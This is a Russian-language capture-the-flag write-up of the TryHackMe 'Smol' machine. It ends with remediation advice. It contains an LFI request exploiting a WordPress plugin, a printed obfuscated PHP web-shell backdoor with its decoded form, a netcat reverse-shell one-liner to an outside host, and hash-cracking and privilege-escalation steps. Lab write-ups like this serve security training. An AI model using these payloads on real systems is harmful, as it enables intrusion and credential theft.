# TryHackMe - Smol

## 1. Reconnaissance (Разведка)

Первым шагом было сканирование портов с помощью **RustScan** для определения периметра атаки.
```bash
rustscan -a 10.65.163.96 -- -sV
```
**Результат:** Обнаружены открытые порты **22 (SSH)** и **80 (HTTP)**.

![Запуск rustscan](Screens/Smol_Recon_1.png)
![Открытые порты](Screens/Smol_Recon_2.png)

На порту 80 запущен веб-сервер Apache 2.4.41. 
Был запущен перебор файлов и директорий черезе **FFUF**:
![Перебор файлов и директорий](Screens/Smol_Fuzz.png)

Исходя из найденных wp-admin, wp-content, wp-includes и т.д можно сделать вывод что тут используется CMS WordPress.

Было запущено сканирование WordPress с помощью **WPScan**:
```bash
wpscan -e u,ap,t --url http://www.smol.thm
```
**Результаты сканирования:**
*   Обнаружен устаревший плагин `jsmol2wp` версии 1.07 (не обновлялся 8 лет).
*   Найдены пользователи: `Jose Mario Llado Marti`, `wordpress user`, `admin`, `think`, `wp`, `diego`, `gege`, `xavi`.

![Найден устаревший плагин через wpscan](Screens/Smol_wpscan_1.png)
![Найдены пользователи через wpscan](Screens/Smol_wpscan_2.png)

---

## 2. Initial Access (Первоначальный доступ)

Поиск уязвимостей для плагина `jsmol2wp` привел к **CVE-2018-20463**, которая позволяет читать произвольные файлы (LFI) на сервере.

![Найден CVE](Screens/Smol_Find_CVE.png)

Был отправлен запрос на чтение конфигурационного файла WordPress:
```http
GET /wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-config.php
```
В ответе сервера успешно отобразилось содержимое `wp-config.php`, где были найдены учетные данные базы данных:
*   **DB_USER:** `wpuser`
*   **DB_PASSWORD:** `kbLSF2...`

![Эксплуатация CVE](Screens/Smol_Exploiting_CVE.png)

Используя найденные учетные данные и список пользователей найденный до этого можно предположить, что wordpress user это wpuser, после можно успешно авторизоваться в панели администратора WordPress (`/wp-login.php`).

![Успешный вход](Screens/Smol_Success_Login.png)

---

## 3. Foothold (Закрепление и RCE)

В панели администратора была обнаружена приватная страница **"Webmaster Tasks!!"**, которая содержала важную информацию:
> `1- [IMPORTANT] Check Backdoors: Verify the SOURCE CODE of "Hello Dolly" plugin as the site's code revision.`

![Обнаружение информации о плагине](Screens/Smol_Find_Page_1.png)
![Обнаружение информации о плагине](Screens/Smol_Find_Page_2.png)

Использовав **CVE-2018-20463** был просмотрен исходный код плагина `Hello Dolly` и обнаруженна обфусцированная строка:
```php
eval(base64_decode('CiBpZiAoaXNzZXQoJF9HRVRbIlwxNDNcMTU1XHg2NCJdKSkgeyBzeXN0ZW0oJF9HRVRbIlwxNDNceDZkXDE0NCJdKTsgfSA='));
```

![Проверка кода плагина](Screens/Smol_Check_Dolly.png)

Декодировав Base64 и расшифровав восьмеричные/шестнадцатеричные последовательности можно понять, что это веб-шелл:
```php
if (isset($_GET["cmd"])) { system($_GET["cmd"]); }
```

![Декодирование строки](Screens/Smol_Decode.png)

Эксплуатация бэкдора позволяет выполнять команды от имени `www-data`.

![Эксплуатация бэкдора](Screens/Smol_Check_Backdoor.png)

Далее был инициирован reverse shell:
```bash
?cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc [local_ip] 444 >/tmp/f
```

![Отправка шелла](Screens/Smol_Send_Reverse_Shell.png)
![Получение шелла](Screens/Smol_Get_Reverse_Shell.png)

---

## 4. Post-Exploitation (Пост-эксплуатация)

Имея доступ к системе, подключаемся к базе данных MySQL, используя ранее найденные учетные данные, и получим хэши паролей пользователей WordPress:
```bash
mysql -u wpuser -p
mysql> use wordpress;
mysql> SELECT * FROM wp_users;
```

![Подключение к MYSQL](Screens/Smol_MySQL_Connect.png)
![Получение хэшей](Screens/Smol_MySQL_Get_Hashes.png)

---

## 5. Privilege Escalation

**Шаг 1: Компрометация пользователя diego**
Попытаясь подобрать каждый из хэшей с помощью **Hashcat** и словаря `rockyou.txt` - удалось получить пароль пользователя `diego`. Пароль: `sandiego...`.

![Подбор хэша пароля через hashcat](Screens/Smol_Crack_Hash.png)

Переключившись на пользователя `diego`, был получен первый флаг `user.txt`.

![Смена пользоавтеля на diego](Screens/Smol_Diego_Connect.png)
![Чтение юзер флага](Screens/Smol_User_Flag.png)

**Шаг 2: Перемещение на пользователя think**
Проведя разведку домашних директорий был обнаружен интересный архив у gege (но недоступный пользователю `diego`), а также, что в папке пользователя `think` доступна для чтения директория `.ssh`, в которой лежал приватный ключ `id_rsa`.

![Интересный файл у Gege](Screens/Smol_Gege_File.png)
![id_rsa у Think](Screens/Smol_Think_id_rsa.png)

Скопировав ключ, подключились по SSH:
```bash
ssh -i id_rsa think@smol.thm
```

![Подключение по SSH к пользователю Think](Screens/Smol_Think_Connect.png)

**Шаг 3: Доступ к бэкапу и компрометация gege**
Проверив группы пользователя `think`, обнаружено, что он также как и `gege` состоит в группах `dev` и `internal`. Это позволяет сделать предположение, что можно сменить без пароля пользователя на `gege`. Теперь имеем доступ к тому самому файлу `wordpress.old.zip`, но распаковать просто так не удается - он под паролем. Отправим его на свою систему для подбора пароля и преобразим в хэш с помощью `zip2john`.

![Получение доступа к gege](Screens/Smol_Gege_Connect.png)
![Попытка распаковать](Screens/Smol_Try_unzip.png)
![Отправка на свою систему и преобразование](Screens/Smol_Send_Zip.png)

Подберем пароль с помощью **John the Ripper**. Пароль от архива: `hero...`. 
Внутри архива лежал `wp-config.php`, в котором были новые учетные данные:
*   **DB_USER:** `xavi`
*   **DB_PASSWORD:** `P@ssw...`

![Подбор пароля от zip](Screens/Smol_Crack_Zip.png)
![Найдены данные](Screens/Smol_Found_Creds.png)

---

## 6. Root

Используя найденный пароль, переключимся на пользователя `xavi`:
```bash
su xavi
```

![Смена пользователя на Xavi](Screens/Smol_Change_To_Xavi.png)


Проверим его права sudo:
```bash
sudo -l
```
Оказалось, что пользователь `xavi` может выполнять **любые команды** от имени root: `(ALL : ALL) ALL`. 
Это позволяет мгновенно получить root-доступ и прочитать финальный флаг:
```bash
sudo su
cd /root
cat root.txt
```
![Смена пользователя на Root](Screens/Smol_Change_To_Root.png)
![Чтение Root флага](Screens/Smol_Get_Root_Flag.png)

---

## Remediation (Рекомендации по устранению)

Для предотвращения подобных атак в реальной инфраструктуре следует:
1.  **Обновление ПО:** Регулярно обновлять CMS WordPress, плагины и темы. Удалить устаревший плагин `jsmol2wp`.
2.  **Аудит кода:** Проводить проверку исходного кода сторонних плагинов (Code Review) перед установкой, чтобы избежать внедрения бэкдоров (как в случае с `Hello Dolly`).
3.  **Управление доступом:** Соблюдать принцип наименьших привилегий (Least Privilege). Запретить пользователю `xavi` выполнение любых команд через `sudo`. Ограничить права групп на чтение домашних директорий других пользователей.
4.  **Безопасность данных:** Не хранить старые резервные копии (`.zip`) с конфиденциальными данными (паролями БД) на рабочем сервере. Использовать сложные пароли и менеджеры паролей.
```